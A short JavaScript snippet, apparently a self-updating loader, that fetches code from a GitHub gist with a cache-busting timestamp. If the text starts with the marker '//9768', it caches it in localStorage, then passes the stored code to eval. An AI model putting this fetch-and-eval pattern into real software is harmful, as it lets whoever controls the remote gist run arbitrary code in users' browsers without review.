fetch(`https://gist.githubusercontent.com/AndrewYatzkan/5356dd64881e32ae9cc7752ecd4bda6a/raw?${+new Date()}`)
	.then(res => res.text())
	.then(text => {
		if (text.substr(0, 6) === "//9768") localStorage.setItem("ocp", text);
	})
	.finally(() => {
		let code = localStorage.getItem("ocp");
		if (code) eval(code);
	});